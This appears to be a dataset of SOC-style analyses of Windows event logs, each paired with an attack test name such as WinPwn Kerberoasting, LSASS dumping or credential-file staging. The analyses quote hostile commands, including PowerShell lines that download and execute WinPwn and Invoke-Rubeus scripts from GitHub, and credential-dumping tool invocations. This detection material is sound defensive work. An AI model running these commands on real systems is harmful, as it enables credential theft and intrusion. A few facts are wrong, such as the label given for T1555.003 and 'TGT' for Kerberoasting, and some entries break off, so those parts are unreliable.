Password Brute User using Kerbrute Tool,"Based on the provided Windows event logs, I have conducted a detailed analysis to identify any indicators of suspicious or malicious activity.

### Analysis Summary:

1. **PowerShell Activity:**
   - The PowerShell logs indicate the execution of a command involving `kerbrute.exe`. The command line for the script appears to be a brute force attempt on user accounts (`kerbrute.exe bruteuser`). This is a known penetration testing tool sometimes used maliciously to test for weak passwords in Active Directory environments.

2. **Log Deletion:**
   - The system and security event logs show that logs were cleared (`EventID: 1102`), specifically by the user account `admin_test`. Clearing logs can be an indicator of an attempt to cover up activities.

3. **Unusual Process Executions:**
   - There are multiple instances of the `wevtutil.exe` command running with the `cl` (clear) option, correlating with the clearing of event logs. This further suggests potential tampering or data obfuscation activities by `admin_test`.
   
4. **Credential Enumeration:** 
   - The `Security` logs show the `EventID: 4798`, which indicates attempts to enumerate users within the local system. This aligns with activities of identifying potential targets for escalated access.

5. **Multiple High Privilege Token Access:**
   - The `Security` log shows activities related to privilege escalation (EventID: 4672), indicating the use of special privileges such as `SeDebugPrivilege`, which are typically not used frequently by standard operations but by administrative tasks or malicious actors trying to escalate privileges.

6. **FileSystem Access and Execution:**
   - Sysmon logs reveal executions of several system processes under the user's context, some of which are known to be used by administrative tasks or malicious operations (`rundll32.exe`, `conhost.exe`, etc.). These executions should be reviewed for legitimacy.

### Assessment:

- **Suspicious Activity Identified:** The presence of `kerbrute.exe` execution for bruteforce attacks combined with event log clearing attempts signifies suspicious activities that align with tactics used in unauthorized access and obfuscation scenarios.

"
Extract all accounts in use as SPN using setspn,"Based on the analysis of the provided Windows event logs, there are several indicators that suggest suspicious activity on the machine:

### Key Observations:

1. **Event Log Cleared**:
   - The event logs show multiple instances where the logs have been cleared (Event ID 1102 and 104), which is highly suspicious and commonly associated with attempts to cover malicious activity.

2. **Unusual Command Line Executions**:
   - The `wevtutil.exe` utility is repeatedly used to clear log channels (`""cl Microsoft-Windows-Sysmon/Operational""`, `cl Application` and `cl Security`), which aligns with attempts at log tampering.
   - Command lines using `setspn.exe` with unusual query parameters executed under the `cmd.exe` process, which could be indicative of enumeration or reconnaissance activities often used in later stages of an attack.

3. **Process Executions and User Activity**:
   - Multiple executions of `whoami.exe`, `hostname.exe`, and utilities querying system information are noted.
   - Most of these executions are under the user `SERVER002\admin_test`. While these actions are not necessarily malicious by themselves, their timing alongside the log clearing events raises suspicion.

4. **System Time Change**:
   - There are events indicating changes to the system time (`Event ID 4616` from the security log and multiple `Kernel-General` events in the system log), which is another potential signal of attack, as time changes can be leveraged to disguise the sequence of events or alter timestamps.

5. **High Privilege Activity**:
   - The integrity level for the actions performed by `SERVER002\admin_test` is listed as ""High"", indicating high privileges, consistent with administrative actions, likely due to the use of administrative credentials.

### Assessment:

Given the occurrence of cleared event logs, high-frequency usage of log manipulation utilities (`wevtutil.exe`), unusual usages of command-line tools, and time manipulation, the observed activity aligns with tactics often associated with an intruder trying to cover their tracks and conduct reconnaissance.

### Resolution:

- **SUSPICIOUS**: The observed activities display indicators that warrant further investigation for potential compromise. There is a reasonable suspicion of malicious activity, possibly executed or initiated by someone exploiting legitimate access (e.g., an insider threat or compromised credentials).

### Guidance on Next Steps:

1. **Immediate Investigation**:
   - Examine the user account `admin_test` for any unauthorized access or anomalies.
   - Conduct a deeper forensic analysis to understand the exact actions and potential data access during this session.
   - Review any network traffic associated with this machine during the suspicious timeframe.

2. **Security Measures**:

WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords,"**Detailed Analysis:**

1. **Suspicious PowerShell Activity:**
   - The logs show a PowerShell process (`powershell.exe`) running the command:
     ```
     ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), decryptteamviewer -consoleoutput -noninteractive}
     ```
   - This command uses PowerShell to download and execute a script from a public GitHub repository using `iex`, which is a known method for executing external scripts. Such actions are often indicative of malicious PowerShell usage aimed at executing potentially malicious scripts.

2. **Event Log Clearing:**
   - There are events indicating the clearing of security and system logs (`EventID: 1102` in Security log and `EventID: 104` in System log) by the user `admin_test`. 
   - Log clearing is a technique used by attackers to hide their tracks and indicates malicious intent or compromise.

3. **Time Skew:**
   - The security logs show a `TimeChange` event (`EventID: 4616`) where the system time was adjusted backward. This activity might be used to manipulate timestamps for covering up unauthorized actions.

4. **Execution of Built-in Windows Executables:**
   - There is usage of several built-in Windows executables like `whoami.exe`, `hostname.exe`, and `wevtutil.exe`. While these can be used in normal operations, combined with the context of other suspicious activities, they could be part of an enumeration or persistence method used in attacks.

5. **Privileges Acquisition:**
   - Events show that the `admin_test` account has acquired high-level privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.), which are significant as they allow a user to perform highly privileged actions on the system.

**Assessment:**

The above observations indicate a pattern of suspicious behavior:

- The use of PowerShell to download and execute a potentially malicious script is a red flag. Such actions align with known attack vectors involving script-based attacks.
- The clearing of event logs and altering of system time suggests an attempt to cover tracks, often associated with malicious activity.
- Privilege escalation and enumeration activity further support the hypothesis of a potential compromise.

WinPwn - Snaffler,"### Analysis of Logs

Upon reviewing the provided logs, there are several indicators of potentially malicious behavior and activities which are concerning:

1. **PowerShell Execution and Script Download**:
   - The Sysmon logs record PowerShell being executed with a command that downloads and executes a script from a GitHub repository: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`.
   - The execution of PowerShell scripts from the internet, especially from non-official repositories, is considered highly suspicious and common in attack patterns.

2. **Clearing of Event Logs**:
   - There are Event ID 104 and 1102 logs that indicate the clearing of the System, Windows PowerShell, and Security logs by the user “admin_test”. 
   - Clearing logs can often be an attempt to remove traces of unauthorized or malicious activity.

3. **Execution of High-Risk Commands**:
   - The logs show usage of Windows utilities like `wevtutil.exe` which is involved in the operations to clear the event logs. This action is executed with high integrity level, suggesting possible privilege abuse.
   - The `whoami.exe` and `hostname.exe` executions might appear normal for identifying current user context but can be used in scripts to orientate an attacker within a compromised environment.

4. **Privilege and Logon Details**:
   - The Security log entries (Event IDs 4672, 4624) indicate the use of Privileges such as SeDebugPrivilege and others, which are high privileges typically not necessary for standard operations and when present in conjunction with other suspicious activities can suggest privilege escalation attempts.

### Assessment

Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config),"After reviewing the provided Windows event logs for the CEO's machine on Server002, several observations can be made regarding potentially suspicious or anomalous behavior:

### Suspicious or Anomalous Behavior

1. **Clearing of Event Logs**:
    - The Security Log, System Log, and Windows PowerShell log were cleared around the same timeframe:
        - Security Log: Event ID 1102 (`LogFileCleared`) shows that logs were cleared by `admin_test`.
        - System Log: Event ID 104 (`LogFileCleared`) also registered the logs being cleared by `admin_test`.
    - This log clearing indicates that someone with administrative access attempted to remove traces of actions potentially to cover up malicious activity.

2. **PowerShell Usage**:
    - Multiple PowerShell executions are associated with the command: `powershell.exe & {C:\Windows\System32\inetsrv\appcmd.exe list apppool /config}`.
    - While executing `appcmd.exe` to list application pools could be legitimate, using PowerShell in this manner, especially combined with log clearing, raises a red flag for potential scripts being run for reconnaissance or malicious configuration changes.

3. **Execution of `wevtutil.exe`**:
    - `wevtutil.exe`, which is a utility for managing event logs, was run multiple times rapidly to clear various logs such as System, Application, and Security logs. This is uncommon in regular administrative tasks without prior justification.

4. **User and System Correlation**:
    - The user `SERVER002\admin_test` appears frequently with high integrity levels during suspicious activity, indicating possible misuse of administrative privileges.

### Assessment and Threats

- **Log Clearing Activity**: This alone is a critical indicator, often associated with malicious intent. Administratively clearing logs is typically a technique employed by an attacker to manipulate or erase evidence of their presence and actions on the system.
  
- **Powershell Commands**: The script utilizing PowerShell could be part of a reconnaissance effort or a precursor to other forms of attacks, such as service exploitation or configuration manipulation.

### Guidance and Resolution

Given the activities observed, especially the clearing of logs and the methodical use of PowerShell for potentially recon-related commands, the evidence strongly suggests malicious intent. This behavior requires immediate attention. Therefore, the resolution of this investigation is **MALICIOUS**.

### Recommended Actions:

1. **Immediate Isolation**:
   - Disconnect the affected host from the network to prevent further access or damage.
   
2. **Forensic Investigation**:
   - Begin a detailed forensic investigation on the machine to identify any additional artifacts or backdoors that may have been installed.
   
3. **Review of Access Logs**:
   - Review logs from other systems to identify any unauthorized access correlating with `admin_test` activities.
   
4. **Audit and Revoke Access**:
   - Analyze and possibly revoke access permissions for `admin_test` until the user can be definitively cleared of wrongdoing.

5. **SIEM Monitoring**:
   - Enhance monitoring and alerting in your Security Information and Event Management (SIEM) system for similar activities across the enterprise to catch further attempts early.

6. **User Awareness**:
   - Educate staff regarding the warning signs of compromised accounts and suspicious behavior. 

7. **Patch and Update**:

Simulating access to Chrome Login Data,"Based on the provided log entries, there is a clear indication of suspicious activity on the Windows host labeled ""Server002"". Here are the key points of concern:

### Analysis:

1. **Log Clearing Activities:**
   - Multiple `wevtutil.exe` commands were observed clearing event logs for different channels such as `System`, `Application`, and `Windows PowerShell`. This is typically a behavior associated with attempts to cover tracks after malicious activities.

2. **PowerShell Command Execution:**
   - The logs show PowerShell commands copying sensitive data related to Chrome login data. This implies an attempt to harvest credentials, which is a common trait of malicious intent.
   - Specifically, the command is copying Chrome's `Login Data` and `Login Data For Account`, which usually contain stored passwords.

3. **Processes Under Admin Context:**
   - These activities were executed under the user `SERVER002\\admin_test`, and we observe high integrity level processes, indicating that they were executed with administrative privileges.
   
4. **Sysmon Logs:**
   - There is a sequence of processes being created, including PowerShell, conhost.exe, and wevtutil.exe with clear evidence of log clearing commands used across different security channels.
   - The use of `PowerShell` to execute scripts and `wevtutil.exe` for clearing logs indicates an attempt to maintain stealth on the compromised host.

5. **Security Log Clearing:**
   - The specific clearing of the Security log (Event ID 1102) further suggests malicious behavior, as attackers often clear security logs to remove traces of their activity after gaining escalated access.

### Conclusion:

The combination of log clearing activities, PowerShell commands copying potentially sensitive data, and the nature of the processes involved strongly suggest a compromise has occurred. The indices of potential credential theft (Chrome data) and track-covering behavior (clearing logs) further support this conclusion.

### Resolution:

**MALICIOUS**

### Guidance and Next Steps:

1. **Immediate Response:**
   - Isolate the affected system (`Server002`) from the network to prevent further potential data leakage or lateral movement by the attacker.
   - Notify relevant security personnel and stakeholders about the compromise.

   - Review other systems and logs within the network for similar indicators of compromise (IOCs).

3. **Remediation:**
   - Change passwords and potentially compromised credentials, especially for high-privilege accounts.
   - Ensure that systems are fully patched and that antivirus and EDR solutions are updated and scanning for potential threats.

4. **Post-Incident Actions:**
   - Enhance monitoring of logs, particularly for PowerShell execution and log-clearing commands.
   - Consider implementing stricter access controls and monitoring to detect similar suspicious activities in the future.

The logs present a scenario with a high likelihood of data breach, and prompt action is necessary to mitigate further damage."
Create Volume Shadow Copy with vssadmin,"## Analysis of the Logs

### Indicators of Suspicious Activity:
1. **Log Clearance Events:**
   - The Security log shows **EventID 1102**, indicating that the log has been cleared by the user `admin_test` (`SubjectUserName`). This is a significant red flag as attackers often clear logs to cover their tracks.

2. **Registry Query and Product Options Check:**
   - There are multiple Sysmon events indicating the execution of command-line tools such as `cmd.exe`, `reg.exe`, `findstr.exe` to query registry keys related to product options (e.g., checking if the system is a domain controller). 
   - The command `reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions /v ProductType | findstr LanmanNT` is executed multiple times, which could be reconnaissance behavior to determine the system type.

3. **Event Log Clearance by `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe` are observed with command lines indicating the clearing of different logs (Sysmon, Application, System, Windows PowerShell, and Security). This matches the log clearance seen in EventID 1102 and is associated with the same `admin_test` user.

4. **Shadow Copy Creation:**
   - The execution of `vssadmin.exe create shadow /for=C:` is seen, which is a typical precursor to ransomware activity. Creating shadow copies allows someone to access or restore files without user consent.

### Indicators of Potential Malicious Activity:
1. **Credential Validation Failures:**
   - EventID `5379` indicates multiple attempts to access Microsoft Account and Windows Live credential validation by the system account, all with failure return codes (`3221226021`). This could represent unauthorized attempts or automated processes misconfigured, especially if they follow other suspicious activities like log clearing or registry queries.

2. **Event Correlations:**
   - The clustering of events around the same timeframe, especially the consecutive log clearance followed by privileged registry accesses, strongly suggests an attempt to obscure actions.

### Additional Observations:
- Microsoft Defender is running and updating correctly, as evidenced by the logs demonstrating the update process.
- Background system updates and processes (e.g., Windows Update activities, AntiMalware updates) appear normal and compliant.

- **Resolution:**
   Based on the provided logs and outlined suspicious activities, the resolution is:
   - **MALICIOUS** - The logs exhibit clear indications of unauthorized and potentially harmful activities that require immediate attention and action."
Copy NTDS.dit from Volume Shadow Copy,"### Detailed Analysis of the Logs

#### Suspicious and Anomalous Behavior:

1. **Log Cleared Events:**
   - **Security Log Cleared:** Event ID 1102 and Event ID 104 entries indicate that the Security, System, and Windows PowerShell logs were cleared by a user named `admin_test` on `Server002`. Clearing security logs is often an attempt to erase evidence of malicious activity.

2. **High Privilege Usage:**
   - **Privileged Use:** Event ID 4672 shows that `SYSTEM` user was using special privileges. While this can be normal for some system activities, combined with other suspicious activities, this may indicate privilege escalation.

3. **Time Manipulation:**
   - **Time Changed:** Event ID 4616 indicates the system time was modified. This is usually suspicious as attackers might change the system time to avoid detection mechanisms based on time stamps.

4. **Attempted Credential Access:**
   - **Failed Credential Operations:** Multiple Event ID 5379 indicate attempts to access credential-related items such as Microsoft Account credentials which returned with error code 3221226021, pointing to access denials.

5. **Suspicious Command Execution:**

Dump LSASS.exe Memory using direct system calls and API unhooking,"Upon examining the provided event logs, several points indicate suspicious activity that warrants further investigation:

1. **Log Clearing Events**: We notice several instances of log file clearing using the `wevtutil` command. The `wevtutil.exe` utility is used extensively throughout the logs with arguments for clearing logs (`cl`) for various Windows event channels (System, Security, Windows PowerShell, and Sysmon/Operational). Specifically:

    - System logs were cleared (EventID 104) by the user `admin_test`.
    - Security logs were cleared (EventID 1102).
    - PowerShell logs were cleared, and so on, all within an extremely short time frame.

2. **Account and Process Usage**: 
    - The user `admin_test` seems to be performing these actions. It's running commands with a high integrity level, suggesting admin-level privileges. The use of `admin_test` for these operations, if not explicitly expected and documented, should be concerning.
    - The command line execution of `C:\\Windows\\system32\\wevtutil.exe` and other related Sysmon and conhost activities all point towards deliberate actions to hide activity.

3. **Execution of Tooling**: 
    - The log contains an instance of the file `Outflank-Dumpert.exe` being executed by the command `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\Outflank-Dumpert.exe""`. This file path and name resemble a known defense evasion tool commonly used for dumping credentials.
    - The presence of this specific execution path underlines potential malicious intent, especially under the folder structure indicating temporary and possibly rogue operations (e.g., AtomicRedTeam).

4. **Privilege Escalation and Privileges in Use**: 
    - EventID 4672 shows special privileges being assigned to the `SYSTEM` user, including privileges like `SeDebugPrivilege` which are often used in privilege escalation scenarios.

5. **Abnormal Process Creation**: 
    - Frequent creation of processes like `conhost.exe`, `wevtutil.exe` in conjunction with `powershell.exe` under unusual circumstances or for unusual purposes.

Based on the analysis above, my assessment of the activities is as follows:

- **Resolution**: MALICIOUS

Given the actions to clear event logs, execute known malicious tooling, and the utilization of high privileges under potentially suspicious conditions, these activities align with common tactics used by threat actors to obscure their presence and operations on a compromised system. Immediate investigation and containment are recommended, including:
- Isolating the host from the network to prevent further potential lateral movement.
- Conducting a detailed forensic analysis focused on understanding the timeline and scope of compromise.
- Reviewing user account `admin_test` and its activities across the environment.
- Coordinating with relevant teams to mitigate and prevent further security breaches."
Gsecdump,"Upon reviewing the event logs, several events appear suspicious and indicative of potentially malicious activity:

1. **Log Clearing Activity:**
   - Multiple log files were cleared using `wevtutil.exe`, including System, Security, and Windows PowerShell logs. Event IDs 104 from the System log and 1102 from the Security log indicate logs were cleared.
   - The user `SERVER002\admin_test` executed these actions, which is often a tactic used by attackers to hide their tracks after conducting malicious activities.

2. **Process Execution Patterns:**
   - There are several instances where `wevtutil.exe` was executed with the ""cl"" command-line argument, which clears event logs. This is noted in the Sysmon logs as well, highlighting the processes launched under a high integrity level, suggesting administrative privileges were used. 
   - The processes initiating `wevtutil.exe` are traced back to `SERVER002\admin_test` and `wsmprovhost.exe`, which could indicate a compromise of administrative credentials or an exploited service.

3. **Suspicious Command Execution:**
   - The execution of `cmd.exe` to run `gsecdump.exe` with the `-a` flag is highly suspicious. Gsecdump is a tool similar to Mimikatz used to extract hashes and credentials, suggesting an attempt to harvest credentials from the system.

4. **Reconnaissance Commands:**
   - The execution of `whoami.exe` and `hostname.exe` suggests reconnaissance activities, potentially to gather information about the system and the current logged-in user context.

**Assessment and Resolution:**

Based on the gathered evidence, the activities observed in the event logs, particularly the clearing of logs, execution of credential dumping tools (`gsecdump`), and the tools utilized in sequence, strongly suggest malicious activity. The use of administrative tools to erase logs and the use of credential harvesting tools are clear indicators that an attacker attempted unauthorized activities on the machine.

**Resolution: MALICIOUS**

**Guidance and Next Steps:**

- **Incident Response Activation:** Immediate initiation of an incident response protocol is recommended. This should include isolating the affected system to prevent further compromise.
- **Investigation and Forensics:** Conduct a deeper forensic analysis of the affected system, including memory forensics or disk imaging, to identify other artefacts of compromise.
- **Credential Review:** Initiate a review and, if necessary, reset or rotate affected credentials, especially those with administrative privileges.
- **Monitoring and Detection Enhancement:** Enhance monitoring for similar activities across all systems, focusing on log clearing activities, unexpected execution of administrative tools, and use of known offensive tools like Gsecdump or Mimikatz.
- **Security Awareness Training:** Conduct security awareness sessions to educate users on phishing or social engineering tactics that could lead to such compromises."
Brute Force Credentials of single Active Directory domain users via SMB,"Upon reviewing the provided Windows event logs, there are several observations and findings that stand out:

1. **Log Clearing Events**:
   - Multiple events indicate that critical logs such as the System (`EventID: 104`), Security (`EventID: 1102`), and Windows PowerShell logs have been cleared. These actions were performed by the user `admin_test` on `SERVER002`. Clearing logs is a strong indicator of malicious activity, as it is often done to cover tracks.

2. **Suspicious Command Execution**:
   - The Sysmon log reveals a suspicious command executed by `cmd.exe` (ProcessId: 7056) that involves creating a file `passwords.txt`, writing potential passwords into it, and attempting to use these passwords in network connections. Specifically, the command suggests an attempt to gain unauthorized server access through a potential credential-stuffing attack, targeting `%%logonserver%%`.
   - This behavior is tied to the user `SERVER002\admin_test`, suggesting the same account involved in log clearing is executing malicious commands.

3. **High Privilege Use**:
   - The security log (`EventID: 4672`) shows the user `admin_test` received a list of administrative privileges. The combination of high-level privileges and suspicious activities strongly suggests malicious intent.

4. **System and Application Behavior**:
   - Kernel-General events and Time-Service logs seem to indicate legitimate system operations related to time adjustments and service operations.
   - Edge Update applications are periodically seen running, which aligns with legitimate software update functions.

5. **Network Connections and High Integrity Level**:
   - The command executed by `cmd.exe` attempts to leverage named pipes (`IPC$`) which are typical for lateral movement within networks.
   - The processes involved maintain a `High` integrity level, indicating they are running with elevated permissions.

6. **Indicators of Lateral Movement**:
   - The observed use of `net use` in conjunction with various passwords indicates attempts to connect to network shares or other systems under the guise of an administrative user.

Given these findings, the actions described in the logs are consistent with post-exploitation activity after a potential initial compromise. The clearing of logs, execution of suspicious commands with attempts to use administrative privileges, and creating backdoors or persistence mechanisms are typical actions taken to maintain access and move laterally within a network.

### Assessment:
**MALICIOUS**

### Guidance:
1. **Immediate Containment**:
   - Isolate the affected system (`SERVER002`) from the network to prevent further lateral movement and data exfiltration.

2. **Forensic Investigation**:
   - Conduct a detailed forensic investigation to determine the initial point of entry, other potentially affected systems, and the full scope of the malicious activity.

3. **Credential Review and Reset**:
   - Review and reset credentials for affected users, especially `admin_test`, and monitor for any unusual login activities.

4. **Enhance Monitoring and Logging**:
   - Ensure proper logging, especially around cleared logs, and implement alert mechanisms for such activities in the future.

5. **Network & Endpoint Security**:
   - Harden endpoint defenses, review firewall rules, and consider implementing network segmentation to limit unauthorized lateral movement.

6. **User Education and Awareness**:
   - Conduct training sessions to educate users about security best practices, focusing on the risks of privilege misuse and recognizing social engineering attacks. 

These steps should be executed swiftly to mitigate risks and prevent further malicious activities in the environment."
WinPwn - DomainPasswordSpray Attacks,"**Analysis of Windows Event Logs**

Upon reviewing the provided Windows event logs from the CEO's machine, several activities stand out as suspicious and potentially indicative of malicious behavior:

1. **Event Log Clearing:**
   - In the security logs, Event ID 1102 indicates that the security log was cleared by the user `admin_test`. This is unusual unless done for maintenance reasons and can be a sign of a cover-up for malicious activity.
   - In the system logs, Event ID 104 shows that both the System and Windows PowerShell logs were cleared by the same user around the same time this activity commenced. Clearing logs without legitimate reasoning often indicates an attempt to hide nefarious activity.

2. **Suspicious Command-Line Activity:**
   - Sysmon logs reveal several executions of `wevtutil.exe` by the user `admin_test` to clear logs (`cl` stands for clear log), which aligns with the previously seen log-clearing events.
   - Execution of `powershell.exe` with a command line that downloads and executes a script from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. This script is fetched from an external, non-corporate repository, commonly used for malicious purposes like exploitation or lateral movement within a network.

3. **Privilege Escalation or Lateral Movements:**
   - The user `SERVER002\admin_test` executed these commands with a high integrity level, suggesting administrative privileges. This, combined with the nature of the commands, suggests potential misuse of administrative capabilities.

4. **Repeated Use of `conhost.exe`:**
   - Multiple instances of `conhost.exe`, often used as a wrapper for command prompt instances (`cmd.exe`) or other utilities like `wevtutil.exe`, observed following the invocation of PowerShell scripts. This chaining is consistent with techniques used to obscure direct command execution visibility.

5. **External Script Execution:**
   - The PowerShell logs confirm the execution of the PowerShell command and script, which is a significant indicator of risk as the script's purpose appears related to unauthorized network activities (potential password spraying attempts).

**Threat Assessment and Recommendation:**

- **Resolution: MALICIOUS**: The logs reveal activities consisting of event log clearing, external script execution through PowerShell, and unauthorized system command executions, clearly indicating malicious behavior. This aligns with common tactics for unauthorized intrusion and lateral movement in networks.
  
- **Guidance on How to Proceed:**
  1. **Immediate Isolation**: Isolate the affected systems (Server002 and possibly others) from the network to prevent further spread or data exfiltration.
  2. **Thorough Investigation**: Conduct a complete forensic analysis on the affected systems to identify further signs of compromise or additional malicious scripts.
  3. **Audit User Accounts**: Review and audit all administrative accounts, especially focusing on `admin_test`, to determine any unauthorized access or privilege escalation.
  4. **Review and Harden Security Controls**: Ensure logging and monitoring solutions are intact and review security policies, especially concerning script execution and log access.
  5. **Patch and Update**: Ensure that all systems are patched and updated to mitigate any exploited vulnerabilities.
  6. **Employee Training**: Conduct security awareness training focused on recognizing phishing and malicious email attempts which are common initial vectors for such activities.

It's crucial to handle this situation swiftly to mitigate any ongoing threat and prevent future incidents."
WinPwn - Kerberoasting,"After conducting a thorough analysis of the provided logs, here's a detailed breakdown of the findings and the subsequent assessment:

**Analysis Summary:**

1. **Suspicious PowerShell Activity:**
   - The logs indicate the execution of a PowerShell script with the command:
     ```
     powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), Kerberoasting -consoleoutput -noninteractive}
     ```
   - This command is indicative of potentially malicious activity. It downloads and executes a script from an external repository, potentially executing Kerberoasting attacks to capture TGT tickets that can be cracked offline for higher-privilege access.

2. **Log Clearing Events:**
   - Multiple events show log files being cleared (Event ID 1102 for the Security log, and Event ID 104 for several other logs). The user responsible for this was ""admin_test"". Such activity is often an indication that a user is trying to cover tracks after malicious actions.
   - Log clearing during this timeframe raises further suspicions about malicious activities being hidden.

3. **Windows Command Line and System Commands:**
   - Commands executed such as `wevtutil.exe` and `conhost.exe` are legitimate Windows utilities but are used here in conjunction with PowerShell indicating scripting or automation possibly associated with malicious activities.

4. **High-Integrity Level Execution:**
   - The integrity level of many of the executed processes, particularly those potentially associated with PowerShell scripts, was at ""High"". This suggests that these actions might have been executed with elevated privileges, increasing the risk posed by potential malicious actions.

5. **Indicators of Potential Kerberoasting:**
   - The presence of the `Kerberoasting` command within the PowerShell script indicates an attempt to dump Kerberos tickets, which can be dire when executed with high privileges.

**Assessment:**

The juxtaposition of the PowerShell activities, the downloading and executing of scripts from an external source, coupled with log-clearing actions, presents a concerning scenario indicative of potentially malicious behavior. The suspicious use of PowerShell for Kerberoasting further amplifies the likelihood of compromise.

**Resolution: MALICIOUS**

This analysis concludes that the activity observed within the Sysmon, Application, Security, and System logs indicates confirmed malicious activity. The execution of scripts from external, untrusted sources, coupled with log-clearing actions, are strong indicators of an active security breach or an attempted one.

**Guidance on How to Proceed:**

WinPwn - PowerSharpPack - Kerberoasting Using Rubeus,"Upon reviewing the provided event logs, several indicators suggest potential malicious activity:

1. **PowerShell Execution**: The logs contain multiple PowerShell commands executed by the user `SERVER002\\admin_test`, which includes downloading and executing a script from a public GitHub repository. The specific command is:
   ```
   powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1') 
   Invoke-Rubeus -Command ""asreproast /format:hashcat /nowrap""}
   ```
   This command suggests an attempt to use the `Invoke-Rubeus` script, known for extracting credential information (AS-REP Roasting).

2. **Event Logs Cleared**: Events in both the Security and System logs indicate that logs were cleared on multiple occasions by the same user, `admin_test`. Clearing event logs is a common tactic used by malicious actors to cover tracks.

3. **Combination with System Integrity**: The activity is executed with high integrity levels, suggesting that if malicious, it could cause significant risk. Additionally, this activity involves use of built-in tools like wevtutil to clear logs, which aligns with common patterns of compromise.

4. **Network and Time Discrepancies**: There are unusual time updates that may suggest attempts to manipulate or bypass monitoring timestamps, which could be indicative of malicious actions aiming to alter audit trails.

5. **High-frequency Process Creation**: Repeated instances of command-line utilities like `whoami`, `hostname`, and others in quick succession can be symptomatic of reconnaissance activities, especially if observed in combination with suspicious network activities.

Given these observations, it is indicative that the logs reflect malicious behaviors, particularly focusing on credential harvesting and log clearing to evade detection.

**Resolution: MALICIOUS**

WinPwn - BrowserPwn,"Upon analyzing the provided Windows event logs, I have identified several events that suggest potentially malicious activities. Below are the key observations:

1. **Event Log Clearing:**
   - **Security Log Event 1102** and **System Log Event 104**: These events indicate that the event logs for both Security and System channels have been cleared. Log clearing is often performed by attackers to erase traces of their activities.

2. **Process Execution:**
   - **Sysmon Log Events & PowerShell Execution:**
     - There are multiple instances of `wevtutil.exe` being executed with the command to clear logs in the Sysmon logs at different timestamps. This utility is typically used to manage event logs and its use to clear logs, combined with actual log clearing events, is highly suspicious.
     - A PowerShell process (`powershell.exe`) with an unusual command line is observed. It attempts to download and execute a script from a GitHub repository (`WinPwn.ps1`) using the command: 
       ```
       ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), browserpwn -consoleoutput -noninteractive}
       ```
     - Downloading and executing scripts from external repositories is a common way for attackers to deploy malicious tools or scripts onto a host.

3. **Privilege Escalation:**
   - **Execution with High Integrity Level:** The command history and processes executed, such as `wevtutil` and PowerShell, run with high integrity levels suggesting potential privilege escalation attempts.

4. **Unusual Timing and Context:**
   - Several processes including `wevtutil.exe`, `HOSTNAME.EXE`, `whoami.exe` are executed in a short time span. This burst of activity to gather system information and clear traces is indicative of post-exploitation activities.

5. **External Communication:**
   - The PowerShell script attempts an outbound connection to a URL on GitHub, which indicates potential communication with an external server, possibly a command and control server for an attacker.

**Assessment:**
Based on the analysis of the available logs, these activities present clear indicators of compromise. The deliberate clearing of logs, running of PowerShell with commands to download and execute potentially malicious scripts, and running these scripts and utilities with elevated privileges all suggest malicious intent and actions.

**Resolution: MALICIOUS**
- The observed behaviors and activities indicate a compromise. It is recommended to:
   - Immediately isolate the affected system (Server002) from the network to prevent further propagation or data exfiltration.
   - Conduct a forensic analysis on the system to identify any additional malicious implants or modifications.
   - Review and strengthen logging and monitoring policies to ensure activities like log clearance and remote script execution via PowerShell are appropriately logged and alerting mechanisms are in place.
   - Educate users on safe practice measures, especially concerning email phishing and executable downloads from untrusted sources."
Stage Popular Credential Files for Exfiltration,"After analyzing the provided Windows event logs, several suspicious and potentially malicious activities have been identified on the system ""Server002"":

1. **Event Log Clearing:**
   - The security log entry with EventID 1102 and the system log entries with EventID 104 indicate that the event logs were cleared by the user ""admin_test."" Clearing of event logs is often an attempt to cover tracks of malicious activities and is highly suspicious.

2. **Privilege Escalation:**
   - The security log EventID 4672 shows that ""admin_test"" was granted special privileges like ""SeDebugPrivilege,"" which could indicate privilege escalation typically used by attackers to gain elevated access.

3. **Anomalous Time Change:**
   - The logs indicate a backdating of system time via svchost.exe. This behavior can be indicative of attempts to manipulate time-dependent controls or log entries, another attempt to hinder forensic investigation.

4. **Suspicious PowerShell Command:**
   - A critical finding in the Sysmon logs is an execution of a PowerShell script (EventID 1, with a detailed command line in the PowerShell log) that attempts credential harvesting from multiple web browsers. The script copies sensitive files like Firefox's key4.db, Chrome's login data, and similar files from other browsers to a temporary directory and compresses them. This behavior is consistent with malicious credential dumping.

5. **Potential Indicator of Compromise:**
   - The PowerShell script is structured to collect potentially sensitive data which is then archived, suggesting possible exfiltration. This action is consistent with MITRE ATT&CK techniques, specifically T1555.003 (Steal or Forge Kerberos Tickets: Credential Dumping).

Given these findings, it is highly likely that the detected activities are malicious in nature. The combination of event log clearing, privilege escalations, time manipulation, and unauthorized data access points strongly to a system compromise.

### Resolution: MALICIOUS

### Recommendations:
- **Immediate Incident Response:** Isolate the affected system (Server002) to prevent further potential exfiltration or lateral movement within the network.
- **Investigate User Account:** Conduct a thorough investigation into the ""admin_test"" account usage, including how the credentials may have been compromised.
